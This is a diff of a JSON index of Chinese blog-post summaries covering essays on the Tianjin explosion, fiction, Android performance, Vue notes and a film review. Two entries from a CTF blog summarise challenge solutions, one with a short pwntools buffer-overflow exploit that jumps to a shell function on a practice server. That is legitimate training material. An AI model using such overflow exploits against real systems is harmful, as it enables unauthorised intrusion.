@@ -1,6 +1,83 @@
 {
   "items": [
     {
+      "id": "3b4751e9e014fb11c106dd60",
+      "title": "天津笔记：那些牺牲的19岁",
+      "summary": "对消防员家属来说，烈士的名号太遥远，他们想知道的，是什么，把年轻的生命抛入了这样的命运。… Continue reading 天津笔记：那些牺牲的19岁 →",
+      "image": "https://wentommy.wordpress.com/wp-content/uploads/2018/08/e8e5383d87a64932b0e7070edb1eb844.jpg",
+      "publishedAt": "2018-08-15T08:56:09Z",
+      "sourceId": "3953acd1dfa15f46",
+      "sourceTitle": "文三娃",
+      "link": "https://wentommy.wordpress.com/2018/08/15/%e9%82%a3%e4%ba%9b%e7%89%ba%e7%89%b2%e7%9a%8419%e5%b2%81/",
+      "detailPath": "articles/3b4751e9e014fb11c106dd60.json"
+    },
+    {
+      "id": "bdc231563c65d0bed69dcd8e",
+      "title": "RE2",
+      "summary": "correct_the_byte FLAG-EiTMzujOpNwYCeervQMFod0hmZHC@ 看一晚上也不知道要 correct 哪个 byte，问了学长得知是异或的 0x13 有问题。所以就 x/34xb $rsi 打印出将要被异或的值，穷举要异或的数爆破。 再加上群里 flag 的开头图片，ctrl+f 找出 flag。 rsi_list = [ 0x 0c , 0x 06 , 0x 0b , 0x 0d , 0x 67 , 0x 0f , 0x 23 , 0x 1e , 0x 07 , 0x 30 , 0x 3f , 0x 20 , 0x 05 , 0x 3a , 0x 04 , 0x 3d , 0x 13 , 0x 09 , 0x 2f , 0x 2f , 0x 38 , 0x 3c , 0…",
+      "image": null,
+      "publishedAt": "2018-08-15T08:41:57Z",
+      "sourceId": "946f35b6a82d9000",
+      "sourceTitle": "空栈顶",
+      "link": "https://emptystack.top/re2/",
+      "detailPath": "articles/bdc231563c65d0bed69dcd8e.json"
+    },
+    {
+      "id": "4cdbcde6ade34ced7e639deb",
+      "title": "潮湿俱乐部",
+      "summary": "我们离开城市的那个夜晚，空气凝滞，蝉鸣在高温中起伏。我们手拉着手，可以感受到彼此的手汗。在奔跑的间隙，我们回头看，西边的天空一片橘红，湮没了星星和月亮，能隐约听到消防车的声音，偶尔还有尖叫和狗吠。我们带走了必须的财物和一只叫做“舌头”的英国短毛猫。在不必须的东西里，我们带走了地图，尽管我们知道这会暴露我们的行踪，因为有了地图就有了目的地。我们还带走了一顶帐篷，虽然可以睡在车里，但我们打算在某些时刻露营。 我们以每小时八十公里的速度离开城市，不是旅行而是逃亡。这是一个真实故事，故事发生在一个闷热的夏季，为了保护我们的隐私，我们必须隐去名字、性别和年龄。这也是一个公路故事，诗人说过“生活，在别处”，而我们知道“生活，在去往别处的路上”。这还是一个酒神故事，我们要把自己投射在万物之中。狂欢？迷乱？也许不行。我们必须…",
+      "image": null,
+      "publishedAt": "2018-08-14T16:00:00Z",
+      "sourceId": "5c361392b1f97efd",
+      "sourceTitle": "Memozine",
+      "link": "https://memozine.me/2018/08/15/humid-club",
+      "detailPath": "articles/4cdbcde6ade34ced7e639deb.json"
+    },
+    {
+      "id": "204c47829fd9fc085a0b48d8",
+      "title": "PWN",
+      "summary": "题解 level0 CTF{713ca3944e92180e0ef03171981dcd41} vulnerable_function 里 buf 只有 0x80 大小，但读取 0x200 个字符；函数里还有 callsystem。将 r 之前的都随意填充掉，跟上 callsystem 的地址就好了。 from pwn import * io = remote ( \" pwn2.jarvisoj.com \" , 9881 ) elf = ELF ( \" ./level0 \" ) io . send ( \" a \" * ( 0x 80 + 0x 8 ) + p64 ( elf . symbols [ \" callsystem \" ])) io . interactive () rop_rop_rop islab…",
+      "image": null,
+      "publishedAt": "2018-08-14T08:16:08Z",
+      "sourceId": "946f35b6a82d9000",
+      "sourceTitle": "空栈顶",
+      "link": "https://emptystack.top/pwn/",
+      "detailPath": "articles/204c47829fd9fc085a0b48d8.json"
+    },
+    {
+      "id": "09d929c52e1d3c9d4c923b67",
+      "title": "关于 Android 系统流畅性的一些思考",
+      "summary": "最近一直想写一些关于 Android 系统流畅度的东西，因为流畅度这个东西，是消费者最直接能体验到的，再加上 Android 一直为人诟病的越用越卡顿，使得大家在提到安卓机的时候，都会有一丝阴影。这也是大部分人买手机首先会考虑 iPhone 的一个原因。 由于",
+      "image": null,
+      "publishedAt": "2018-08-13T04:01:23Z",
+      "sourceId": "1aa1837ca33d8d55",
+      "sourceTitle": "Android Performance",
+      "link": "https://androidperformance.com/2018/08/13/Some-Thoughts-on-the-Fluency-of-Android/",
+      "detailPath": "articles/09d929c52e1d3c9d4c923b67.json"
+    },
+    {
+      "id": "8b1b9401db7bb33ef7e32084",
+      "title": "天津笔记：每一道异样的火光都像电击着心脏",
+      "summary": "当独自一人戴着这个口罩走在天津港那片废墟上时，当看到不远处危化品仓库还在闪着红光时，当看到那位说“苯超标”但自己也没戴口罩的年轻警察时，我想起了电视剧里的那句话：“中国人，死於听天由命和漫不经心。” … Continue reading 天津笔记：每一道异样的火光都像电击着心脏 →",
+      "image": "https://wentommy.wordpress.com/wp-content/uploads/2018/08/e5a4a9e6b4a51.jpeg",
+      "publishedAt": "2018-08-12T07:52:37Z",
+      "sourceId": "3953acd1dfa15f46",
+      "sourceTitle": "文三娃",
+      "link": "https://wentommy.wordpress.com/2018/08/12/%e5%a4%a9%e6%b4%a5%e5%a4%a7%e7%88%86%e7%82%b8/",
+      "detailPath": "articles/8b1b9401db7bb33ef7e32084.json"
+    },
+    {
+      "id": "433cfd7b2fd7c363ec0fed89",
+      "title": "季夏的普通一天",
+      "summary": "小布尔乔亚者的深夜反思。",
+      "image": null,
+      "publishedAt": "2018-08-12T00:00:00Z",
+      "sourceId": "d48d6f28fe78bc92",
+      "sourceTitle": "DrPika's Blog",
+      "link": "https://blog.drpika.com/posts/2018-08-12",
+      "detailPath": "articles/433cfd7b2fd7c363ec0fed89.json"
+    },
+    {
       "id": "60361ff94847e39debb0143e",
       "title": "季夏的普通一天",
       "summary": "小布尔乔亚者的深夜反思。",
@@ -582,83 +659,6 @@
       "sourceTitle": "Wiwi.Blog Blog",
       "link": "https://wiwi.blog/blog/animal-drinks",
       "detailPath": "articles/450474e3812fdf4d6f9df416.json"
-    },
-    {
-      "id": "4b1e505dd2c61695055ab53d",
-      "title": "博客折腾“大”记",
-      "summary": "",
-      "image": null,
-      "publishedAt": "2018-03-18T00:00:00Z",
-      "sourceId": "d48d6f28fe78bc92",
-      "sourceTitle": "DrPika's Blog",
-      "link": "https://blog.drpika.com/posts/2018-03-18",
-      "detailPath": "articles/4b1e505dd2c61695055ab53d.json"
-    },
-    {
-      "id": "3d73666f610bdeccaa625163",
-      "title": "博客折腾“大”记",
-      "summary": "",
-      "image": null,
-      "publishedAt": "2018-03-18T00:00:00Z",
-      "sourceId": "3e335517f4e1112a",
-      "sourceTitle": "Dr.Pika's Blog",
-      "link": "https://blog.drpika.com/posts/2018-03-18",
-      "detailPath": "articles/3d73666f610bdeccaa625163.json"
-    },
-    {
-      "id": "0785055a3678191c0995d826",
-      "title": "Parcel.js + Vue 搭建笔记",
-      "summary": "2021-06-08 时至今日，该篇文章的内容已有所过时。 Parcel 的地位也似乎一直有些尴尬。 零配置的确是一个亮点，但是到真正编写复杂庞大的项目，我们还真的需要零配置吗？ 而谈起配置，似乎又难与悠久历史生态的 Webpack 同台竞技。 至于速度，则难以与新诞生的基于 ES 打包的 Vite 相匹敌。 现今的我基本已经转向使用 Vite ，而并未再尝试 Parcel 的使用。 去年（已经是三年前了！）年末便听得新一代打包工具 Parcel.js 的风风火火，今日（两年前的某一天）也终于得以静下心来试一试。 访问 https://www.yunyoujun.cn/posts/vue-parcel-demo 阅读全文。",
-      "image": null,
-      "publishedAt": "2018-02-20T21:13:42Z",
-      "sourceId": "410b11347b8a16bf",
-      "sourceTitle": "云游君的小站",
-      "link": "https://www.yunyoujun.cn/posts/vue-parcel-demo",
-      "detailPath": "articles/0785055a3678191c0995d826.json"
-    },
-    {
-      "id": "5f15e9c4b55b592b5ca00b4a",
-      "title": "Vue 学习笔记",
-      "summary": "使用 Vue.js 过程中的一些笔记。 访问 https://www.yunyoujun.cn/posts/vue-learn-note 阅读全文。",
-      "image": null,
-      "publishedAt": "2018-02-20T21:00:24Z",
-      "sourceId": "410b11347b8a16bf",
-      "sourceTitle": "云游君的小站",
-      "link": "https://www.yunyoujun.cn/posts/vue-learn-note",
-      "detailPath": "articles/5f15e9c4b55b592b5ca00b4a.json"
-    },
-    {
-      "id": "58aa840faae8b40ce5bb2f77",
-      "title": "钥匙和衬衫",
-      "summary": "钥匙 第一次去你家的时候，你就给了我一把钥匙。钥匙是备用的，用纸包着藏在门口的某个角落。那把钥匙挂我的钥匙串上，一直到你离开某岛前我才交还给你。那时候你外派在某岛，住在23层顶楼，推开窗户是呼呼的风，能看到远处的海，有时还能看到海雾向陆地慢慢侵袭，像是奥特曼里怪兽来临前铺垫的雾气。春夏的几个月里，我们像是在梦里度过的。你带我去你觉得好吃的餐厅，还带我去坐夜晚的摩天轮。我们一起宅在家里睡午觉，躺在沙发上看电影，推着购物车逛超市，或者骑着单车去往什么地方。 后来工作结束，你也回去了。再见到你的时候，你又给了我一把钥匙。物业要求住户去办理进单元门栋的门卡，我把蓝色的门卡和钥匙挂在一个钢环上。前天我送妈妈出门，回来开门的时候，发现怎么没有挂在我的钥匙串上呢？我在家里找了一遍，没有找到，昨天又找了一遍，还没有找到。我心…",
-      "image": null,
-      "publishedAt": "2018-02-17T16:00:00Z",
-      "sourceId": "5c361392b1f97efd",
-      "sourceTitle": "Memozine",
-      "link": "https://memozine.me/2018/02/18/key-and-skirt",
-      "detailPath": "articles/58aa840faae8b40ce5bb2f77.json"
-    },
-    {
-      "id": "f50d26c9a0890fefb51157a4",
-      "title": "大众社会是幻觉吗",
-      "summary": "西方大众社会理论出现于 19 世纪。这一时期的大众社会论者主要是一些社会学家如滕尼斯、迪尔凯姆、齐美尔、托克维尔等，他们在从不同侧面论述传统社会向现代社会转型过程中，出现的种种弊端，将其视为大众崛起的结果，并对前现代社会的景象表示怀念。比如鲍曼的《共同体》，滕尼斯的《共同体与社会》等等，都是在追忆那种人们凝聚团结的美好。 20 世纪 30 年代至 50 年代，大众社会理论成为批判法西斯极权主义制度的武器，其代表人物有阿多诺、霍克海默、马尔库塞、弗洛姆、曼海姆、阿仑特等。这个时期的大众社会论者对西方现代性之困境与危机进行了深刻的反省和批判。20 世纪 50 年代以后 , 美国的米尔斯、理斯曼、科恩豪泽、布鲁默等一批社会学理论家 , 继续用大众社会范畴分析美国现代性发展所呈现出来的各种病理现象。 美国学者科恩豪泽…",
-      "image": null,
-      "publishedAt": "2018-02-06T16:00:00Z",
-      "sourceId": "5c361392b1f97efd",
-      "sourceTitle": "Memozine",
-      "link": "https://memozine.me/2018/02/07/mass-society-theory",
-      "detailPath": "articles/f50d26c9a0890fefb51157a4.json"
-    },
-    {
-      "id": "83205b6314401c25ce1eef51",
-      "title": "【动画电影】《声之形》观后感",
-      "summary": "前言 今天下午在家里坐立不安地等成绩，加之身体不大舒服，也不怎么想敲代码。便看了看电视。 起初看得是 《哆啦A梦：新·大雄的日本诞生》 。 旧漫画与老剧场版都有看过，所以剧情基本一目了然。每部剧场版里进入冲突前总有一段无忧无虑的半冒险生活，一直是我最喜欢的部分。 小时候缠着老爸买帐篷，这里差不多就是源头了。 虚假的历史永远不可能战胜真正的历史 哆啦A梦喊出这句话后，掷出货真价实的石矛击败了来自 23 世纪的反派。 访问 https://www.yunyoujun.cn/posts/the-shape-of-voice 阅读全文。",
-      "image": null,
-      "publishedAt": "2018-02-03T19:40:18Z",
-      "sourceId": "410b11347b8a16bf",
-      "sourceTitle": "云游君的小站",
-      "link": "https://www.yunyoujun.cn/posts/the-shape-of-voice",
-      "detailPath": "articles/83205b6314401c25ce1eef51.json"
     }
   ]
 }
